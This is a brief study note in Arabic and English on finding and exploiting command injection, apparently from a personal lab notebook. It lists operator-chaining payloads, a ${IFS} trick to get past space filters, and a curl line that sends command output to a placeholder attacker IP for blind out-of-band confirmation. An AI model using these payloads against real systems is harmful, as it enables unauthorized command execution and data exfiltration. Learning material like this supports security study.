# Command Injections

> Status: 🟨 In progress

## Overview
اكتشاف واستغلال ثغرات حقن الأوامر (Command Injection) في تطبيقات بتمرر input المستخدم لأوامر النظام من غير sanitization.

## Key Concepts
- operators زي ; && || | بتسمح بتنفيذ أمر إضافي
- Blind command injection محتاج out-of-band technique (curl لسيرفرك) أو time-based
- فلترة المسافات ممكن تتجاوز بـ ${IFS} أو quoting

## Important Commands / Tools
```bash
127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1; sleep 5
127.0.0.1; curl http://<attacker_ip>/$(whoami)
```

## Lab Notes / Walkthrough
- جربت كل operator لوحده عشان أفهم هيتصرف إزاي لو الأمر الأساسي فشل أو نجح
- استخدمت curl لسيرفري الخاص كـ out-of-band confirmation لما الرد مكنش بيظهر حاجة

## Common Mistakes / Gotchas
- الاعتماد على ظهور output في الرد بس، مع إن كتير من الحالات بتكون blind

## Related Cheatsheet
- [../../cheatsheet/](../../cheatsheet/)
